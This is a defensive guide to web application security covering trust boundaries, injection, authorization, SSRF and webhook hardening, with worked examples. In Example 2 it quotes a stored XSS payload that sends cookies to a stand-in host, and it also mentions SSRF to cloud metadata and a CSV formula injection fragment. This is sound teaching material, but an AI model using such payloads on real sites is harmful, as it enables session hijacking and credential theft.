# Web Application Security

## Purpose

Build web applications that survive contact with adversaries: think in trust boundaries and attacker economics, apply defense in depth (belt-and-braces) deliberately, and neutralize the classes that account for most real-world compromise — injection, broken auth, XSS, CSRF/SSRF, and authorization holes.

## When to use

- Designing any endpoint, form, upload, webhook, or integration that touches untrusted input (i.e., all of them).
- Reviewing code that crosses a trust boundary: user → server, service → service, server → third party.
- Threat-modeling a new feature, especially ones touching money, PII, auth, file handling, or admin capability.
- After a pentest/audit finding, to fix the *class* rather than the instance.
- Evaluating "is this paranoid enough / too paranoid?" tradeoffs.

## Goals

- Every trust boundary drawn explicitly, with validation and authorization enforced *at the boundary*, server-side.
- Injection-class bugs made impossible by construction (parameterization, encoding-by-default), not by vigilance.
- Authorization checked object-by-object (no IDOR); authentication flows follow the boring, proven shapes (see authentication; authorization).
- Defense in depth on the assets that matter: two independent controls between attacker and crown jewels.
- Fixes ship as class-fixes with regression tests and a searchable pattern, not whack-a-mole patches.

## Expert Mental Model

- **Draw the trust boundaries first; everything else is commentary.** A trust boundary is any line where data or control passes from a less-trusted to a more-trusted context: browser→server, service→service, your app→vendor webhook, database→template. Security bugs are almost always a boundary treated as if it weren't one — the "internal" API that trusts its caller, the webhook processed without signature verification, the admin panel that trusts the `role` claim the client sent. Experts diagram the boundaries (even mentally) and ask of each: what enters here, what's it allowed to do, and *who verified that on this side of the line?* Client-side validation is UX; only server-side validation is security.
- **The attacker is an economist, not a wizard.** Real attacks follow ROI: automated scanners hit every endpoint with known-class payloads; credential-stuffing replays breach dumps; the sophisticated attacker chains three mediums into a critical. Your job is rarely "unbreakable" — it's raising cost above payoff for your asset class and being un-quiet to attack (see observability: security events are events). This also prioritizes correctly: the IDOR on invoice IDs outranks the theoretical timing attack, because one is scriptable in an afternoon.
- **Kill bug classes, not bug instances.** The expert response to one SQL injection is not one fix — it's parameterized queries enforced by lint/review everywhere, because where there was one there are siblings (see root-cause-analysis class-fixes). The great class-kills: parameterized queries kill SQLi; contextual auto-escaping template engines kill most XSS; a CSP kills much of the rest; SameSite cookies + tokens kill CSRF; centralized object-level authorization kills IDOR; an allowlist URL fetcher kills SSRF. Choosing frameworks and patterns that make the vulnerability *inexpressible* beats training everyone to be careful every time.
- **Belt-and-braces: two independent controls, deliberately.** Defense in depth means the attacker must be lucky twice: parameterized queries *and* least-privilege DB accounts (see secrets-and-supply-chain least-privilege) — so the SQLi that somehow lands can't read the users table; CSP *and* output encoding; signed webhooks *and* replay windows; authz checks *and* row-level security. The discipline is *independence* (controls that don't share a failure mode) and *selectivity* (depth on crown jewels, not uniform paranoia everywhere — uniform paranoia produces friction that gets bypassed, which is worse). A layer that looks redundant given the other layers is often the design working (see first-principles: don't first-principle away the second lock).
- **Untrusted data stays data.** The unifying theory of injection (SQL, XSS, command, template, header, log injection): untrusted input crossed into an interpreter context still wearing its data costume. The universal fix: keep data and code in separate channels (parameters, not string-building), and when data must enter a rendered/interpreted context, encode *for that exact context* (HTML body vs attribute vs URL vs JS) at the moment of insertion. "Sanitize on input" is a myth that breaks legitimate data and misses contexts; encode-on-output-per-context is the invariant.
- **AuthN is who you are; authZ is what you may do; the second is where apps actually bleed.** Authentication has converged on boring solved shapes — use them (see authentication). Authorization is bespoke per-app and therefore where the bugs live: the endpoint that checks *login* but not *ownership* (IDOR), the state-changing GET, the admin function reachable by URL, the multi-step flow checkable only at step one (see authorization for the full treatment). Every handler answers: is this user allowed to do this verb *to this specific object*? — and the check lives server-side, centralized, deny-by-default.

## Workflow

1. **Diagram the trust boundaries** for the feature: every arrow where data crosses trust levels, including "internal" ones (service→service, queue consumer — see async-processing, cron, webhook). For each: entry validation, authorization, and what the downstream context is (SQL? HTML? shell? URL fetch?).
2. **Threat-model with STRIDE-lite** (30 minutes, not a workshop): for each boundary — spoofing (who could fake the caller?), tampering (what if this payload is hostile?), info disclosure (what leaks in errors/responses?), privilege escalation (what's the max damage from this entry point?). Rank by asset value × attack cheapness.
3. **Make injection inexpressible**: parameterized queries only (lint against string-built SQL — see postgres); auto-escaping templates with any `raw`/`dangerouslySetInnerHTML` treated as a security review trigger; no user input into shell commands, file paths, or fetch URLs without allowlisting.
4. **Wire the authz check into every handler** via middleware/decorator that requires an explicit object-level permission (deny if the handler forgot to declare) — the pattern where forgetting fails closed (see authorization centralization).
5. **Apply the standard hardening baseline**: CSP (start report-only, then enforce), SameSite=Lax/Strict cookies + HttpOnly + Secure, CSRF tokens on state changes, security headers, rate limiting on auth and expensive endpoints (see authentication rate-limiting), strict `Content-Type` handling on uploads.
6. **Handle files and URLs as the hazmat they are**: uploads — validate type by content not extension, store outside webroot / in object storage with random names, serve with content-disposition and a separate domain; outbound fetches of user-supplied URLs — allowlist schemes/hosts, block private IP ranges including redirects-to-private (SSRF).
7. **Add the second, independent control on crown-jewel paths**: least-privilege DB roles, row-level security, signed+replay-windowed webhooks, step-up auth for destructive actions (see authentication), egress restrictions.
8. **Make attacks loud**: log authz denials, validation rejections, signature failures with actor/object context (see observability); alert on patterns (enumeration, stuffing bursts) not single events.
9. **On any finding**: fix the instance, then grep for the class (same pattern elsewhere), add the lint/test that prevents recurrence, and record it (see root-cause-analysis; the regression test is the receipt).
10. **Review with attacker eyes before ship**: spend 20 minutes actually trying — other users' IDs in your endpoints, `'` and `<script>` in your fields, replayed webhooks, the admin URL logged out. Cheap, embarrassing, effective.

## Decision Tree

- If input crosses a trust boundary → validate server-side against a spec (type/length/range/allowlist), then treat as data forever after; encode per-context at every output.
- If building a query/command/URL/HTML from any variable → is any part attacker-influenced (including via database round-trips — stored XSS travels)? → parameterize/encode; never concatenate.
- If an endpoint takes an object ID → ownership/permission check against *that object*, every time; sequential integer IDs also argue for UUIDs (belt) *and* the check (braces) — never UUID-obscurity alone.
- If receiving a webhook/callback → verify signature with a constant-time compare, enforce a timestamp replay window, process idempotently (see async-processing idempotency; api-design).
- If fetching a user-supplied URL (previews, imports, PDF renderers) → SSRF posture: scheme+host allowlist, resolve-then-check for private ranges, no redirect-following across the check, egress-restricted network if possible.
- If handling secrets, tokens, or PII in code paths → they never enter logs, error messages, or URLs (see secrets-and-supply-chain; observability scrubbing).
- If an error occurs → user gets generic + correlation ID; logs get detail (stack traces and SQL in responses are free recon — see interface-states error honesty *without* internals).
- If a security control creates real user friction → don't silently weaken it; tier it (step-up auth for sensitive ops only, risk-based challenges) — friction uniformly applied gets bypassed organizationally.
- If you find one instance of a vulnerability class → assume siblings; class-sweep before closing the ticket.
- If the fix is "we'll be careful" → reject it; find the make-it-inexpressible version (pattern, lint, middleware). Vigilance doesn't scale; construction does.
- If unsure whether something is exploitable → assume yes for prioritization if it's on a scanner's path (internet-facing, known class); buy certainty only when the fix is genuinely expensive (see judgment-under-uncertainty information-buying).

## Heuristics

- Validate input against what it *should be* (allowlist), not what it shouldn't (blocklists lose to encodings you haven't heard of).
- Encode for the context you're entering, at the moment of entry — HTML-encoding a value that lands in a JS string is the wrong armor for that street.
- Every `GET` that changes state is a CSRF bug wearing a REST costume (see api-design verb semantics).
- The database account your app uses should be unable to do what your app never does — no DDL, no cross-schema reads; the SQLi that lands in a shackled account is a finding, not a breach.
- IDs in URLs are attacker-controlled input; so are headers, cookies, and every field of a JWT before verification (`alg:none` and unverified claims have bitten real systems).
- Serve user-uploaded content from a different origin than your app — one line of architecture kills a whole XSS family.
- Rate-limit by the resource that's scarce: login attempts per account *and* per IP; OTP guesses per session; password resets per target (see authentication).
- Security logs answer "who did what to which object from where" — a denial without actor and object is a line of noise (see observability structured events).
- Grep is a security tool: `dangerouslySetInnerHTML`, `raw(`, `eval(`, string-concat near `query(`, `verify=False` — a five-minute audit that regularly finds Christmas.
- Timing matters at auth boundaries: constant-time compares for secrets/signatures; identical responses for "no such user" and "wrong password."
- Dependency and header scanners (see ci-cd security gates) catch the boring 80% for near-zero effort — take the free wins before the clever ones.

## Quality Checklist

- [ ] Trust boundaries diagrammed; every entry point has server-side validation and object-level authz.
- [ ] Zero string-built queries/commands/HTML; templating auto-escapes; raw-output escapes are inventoried and reviewed.
- [ ] Standard baseline live: CSP, cookie flags (HttpOnly/Secure/SameSite), CSRF protection, security headers, rate limits on auth paths.
- [ ] Uploads validated by content, stored out of webroot/off-origin; outbound fetches SSRF-hardened.
- [ ] Webhooks signature-verified, replay-windowed, idempotent.
- [ ] Crown-jewel paths have two independent controls; DB roles are least-privilege.
- [ ] Errors: generic to users, detailed to logs, secrets in neither.
- [ ] Security events logged with actor/object/origin; enumeration and stuffing patterns alerted.
- [ ] Findings fixed as classes: sweep + lint/test + record.
- [ ] 20-minute attacker-eyes pass done on the feature before ship.

## Failure Modes

- **Client-side security**: validation in React, trust in the API — the attacker speaks curl; every rule not re-enforced server-side is a suggestion.
- **The trusted internal**: service-to-service calls with no auth "because it's inside the VPC" — one SSRF or compromised pod later, "internal" is the attacker's adjective (see system-design zero-trust seams).
- **Sanitize-on-input theater**: input "cleaned" of `<script>` on the way in — breaking O'Brien's name, missing `onerror=`, and doing nothing for the SQL context; the data/code separation never actually enforced.
- **Whack-a-mole patching**: the reported XSS fixed in that one field; its eleven siblings ship on; the pentest next year finds the same class, again — instance-fixing as a lifestyle (see root-cause-analysis).
- **Authorization by obscurity**: "nobody knows that URL," "the IDs are random" — enumeration, log leaks, and referer headers know; obscurity is a fine *belt* and a catastrophic *only layer*.
- **Friction backlash**: uniform maximal paranoia (MFA prompts everywhere, 12-step flows) → users and even teams route around the control (shared accounts, API keys in spreadsheets) — the net posture *lower* than tiered sensible defaults (see the tradeoffs).
- **Secret-bearing logs**: tokens in URLs, passwords in request-body logs, PII in error trackers — the breach that happens via your own observability stack (see secrets-and-supply-chain; observability scrubbing).
- **JWT credulity**: claims read before signature verification, `alg` honored from the token, no expiry check, revocation unhandled — the token trusted because it *looks* cryptographic (see authentication token handling).

## Edge Cases

- **Stored/second-order injection**: the payload enters cleanly, sleeps in the database, and detonates in a different context later (the admin dashboard rendering usernames; the CSV export becoming a formula in Excel — `=cmd|...` — CSV injection is real). Encode at *every* output, not just the obvious one.
- **Redirect-chain SSRF**: the allowlisted URL 302s to `169.254.169.254` (cloud metadata) — check the *final* destination, or better, don't follow redirects across the trust check.
- **Unicode and encoding bypasses**: normalization happening *after* validation (`％00`, overlong UTF-8, homoglyph domains) — validate the canonical form; normalize first, check second.
- **Race-condition authz (TOCTOU)**: the coupon checked then redeemed non-atomically; balance checked then debited — concurrency is a security surface (see concurrency-bugs; postgres transactions for the atomic check-and-act).
- **File type lies**: extension says PNG, magic bytes say PHP; polyglot files valid as two types at once — content-sniff *and* re-encode images if they're re-served (transcoding kills polyglots).
- **The multi-step flow checked once**: authorization verified at step 1, steps 2–5 keyed off a session blob the client can replay into a different flow — re-check at the state *transition that matters* (the charge, the role change), not the entry gate.
- **GraphQL and batch endpoints**: one endpoint, many resolvers — per-resolver authz (the REST middleware pattern doesn't transfer automatically), depth/complexity limits against DoS-by-query (see api-design).
- **Tenant bleed in caches and search**: the multi-tenant cache key missing the tenant ID; the search index queried without a tenant filter — isolation is only as strong as its most forgetful layer (see caching key discipline; system-design multi-tenancy).

## Tradeoffs

- **Security vs friction**: every control taxes legitimate users; the budget spends best tiered — heavy on money/PII/destructive ops (step-up auth), light on browsing. A bypassed control is worse than a lighter one that's actually honored.
- **Depth vs complexity**: each layer is code, config, and a thing that breaks at 3am (the WAF blocking the legitimate webhook) — depth on crown jewels, simplicity elsewhere; audit layers for *independence*, since correlated layers are one layer at twice the cost (see judgment-under-uncertainty correlated failures).
- **Error honesty vs recon economy**: helpful errors aid users and attackers alike — the split (generic+ID outward, detail inward) costs a correlation-ID lookup and buys both worlds (see interface-states).
- **Blocking vs monitoring**: enforce-mode CSP breaks unknown legit flows; report-only catches attacks without stopping them — the standard path (observe, tune, enforce) trades a window of softness for not breaking production; know which mode you're in and for how long.
- **Build vs adopt for auth machinery**: hand-rolled crypto/auth flows are where confident teams create CVEs; boring adopted standards (see authentication) trade flexibility for the thousands of eyes already on them — the flexibility is almost never worth it.
- **Fix-now vs class-fix-later**: under incident pressure, the instance-patch ships first — legitimately; the tradeoff is honored only if the class-sweep ticket survives the week (see production-debugging: stabilize, then root-cause).

## Optimization Strategies

- Centralize the enforcement points: one query layer, one output-encoding path, one authz middleware, one outbound-fetch wrapper — then hardening is a code change in four files, and grep-auditing the exceptions is feasible.
- Put the cheap gates in CI (see ci-cd): dependency audit, secret-scanning, header checks, the lint rules banning string-built SQL and raw HTML — findings at commit-time cost 1% of findings at pentest-time.
- Maintain an attack-surface inventory: every internet-facing route with its auth level, generated from the router, diffed on deploy — "what got exposed this week" as a reviewable artifact.
- Threat-model at design time on features touching money/PII/admin (the 30-minute STRIDE-lite), not post-hoc — moving the security conversation left of the code is the single highest-ROI process change.
- Turn pentest/bounty findings into permanent rent: each finding → class-sweep → lint/test → a line in the team's "known classes" doc — the same finding twice is a process bug, not a code bug.
- Practice attacker-eyes as a skill: quarterly, one engineer spends a day attacking a feature with OWASP cheat sheets open — the developers who have *been* the attacker write different code afterward.

## Self Review

- Where are the trust boundaries in what I just built — and can I point to the server-side check at each one?
- What contexts does user data flow into (SQL, HTML, shell, URL, logs, CSV) — and is it encoded for *each*, at output?
- For every object ID this feature touches: where exactly is the check that *this* user may act on *this* object?
- If my one main control fails (the query layer, the middleware), what's the second, independent thing between attacker and the data?
- What would the attack look like in my logs — and would anything actually alert?
- Did I just fix an instance? Where are its siblings, and what now makes the class inexpressible?
- What did I make more annoying for users, and did I tier it or just tax everyone?
- Have I actually *tried* to break this — other users' IDs, hostile payloads, replayed requests — or am I shipping on hope?

## Examples

**1. The IDOR class-kill.**
Bounty report: `/api/invoices/18342` returns any invoice to any logged-in user. Instance fix is one line; the expert response is the sweep: grep the router for every handler taking an ID — 14 more endpoints check login but not ownership (the class). Fix: a `require_permission(user, action, object)` decorator that the framework *requires* on every route (undeclared → 500 in dev, deny in prod — fails closed), object-level checks centralized over the ownership graph (see authorization). Regression tests iterate all routes asserting cross-tenant denial. IDs migrate to UUIDs as a belt; the check is the braces. The bounty class goes quiet permanently, and new endpoints can't recreate it silently.

**2. Stored XSS via the support dashboard.**
Customer names render fine in the React app (auto-escaped) — but the internal support tool, an older server-rendered admin, prints them with a template `| raw` filter someone added to render markdown. A customer named `<img src=x onerror=fetch('//evil/'+document.cookie)>` becomes a session-stealer targeting *support agents* — a stored, second-order attack through the highest-privilege users. Fixes in depth: the raw filter replaced with a sanitizing markdown renderer (instance), an inventory-and-review of every raw-output escape in both codebases (class), CSP with no inline script on the admin origin (belt), and admin sessions bound to hardware-key auth so a stolen cookie is worth less (braces — see authentication). The lesson encoded in the known-classes doc: *escaping is per-renderer; data trusted by one app is still hostile to the next.*

**3. SSRF through the link-preview feature.**
"Paste a URL, get a preview card" — the fetcher follows the URL server-side. Attacker pastes an innocent domain that 302s to `http://169.254.169.254/latest/meta-data/` and reads cloud credentials from the preview text. Hardening: scheme allowlist (http/https), DNS-resolve then reject private/link-local ranges, redirects re-checked per hop (or not followed), the fetcher moved to an egress-restricted network segment where the metadata IP is unroutable (independent layer), and previews rendered from a cached sanitized snapshot rather than live fetches (see caching). The 30-minute design-time STRIDE pass would have caught this for the cost of a whiteboard photo — the retro's actual finding.

**4. The webhook that trusted the internet.**
Payment webhooks processed on POST body alone — no signature check ("Stripe sends them, who else would?"). Anyone who reads the docs, it turns out: a crafted `payment_succeeded` marks arbitrary orders paid. Fixes: signature verification with constant-time compare, 5-minute timestamp replay window, idempotency on event ID so replays are no-ops (see async-processing idempotency), *and* the state machine hardened so "paid" additionally requires a verifying API read-back to the provider (independent control — trust, then verify against the source of truth; see event-driven: events as claims, not facts). The attacker-eyes pass that found it took eleven minutes.

## Evaluation Rubric

Score 1–10:

- **1–2**: Client-side validation as security; string-built queries; login-only authorization; secrets in logs; "it's internal" as an architecture.
- **3–4**: Framework defaults doing incidental work (ORM parameterization, template escaping) but boundaries undiagrammed, raw-escapes unaudited, webhooks/uploads/URL-fetches soft, findings fixed as instances.
- **5–6**: Boundaries explicit with server-side validation and object-level authz; injection inexpressible by construction; standard baseline (CSP, cookie flags, CSRF, rate limits) live; errors split outward/inward.
- **7–8**: Full checklist: SSRF/upload/webhook hardening, two independent controls on crown jewels, least-privilege DB roles, security events logged and alerted, class-sweeps with regression tests, attacker-eyes pass before ship.
- **9–10**: Additionally: design-time threat modeling routine on sensitive features; centralized enforcement points with CI gates; attack-surface inventory diffed on deploy; bounty/pentest findings demonstrably never recur as a class; friction visibly tiered by risk — and at least one "redundant" layer on record catching the failure the primary missed.
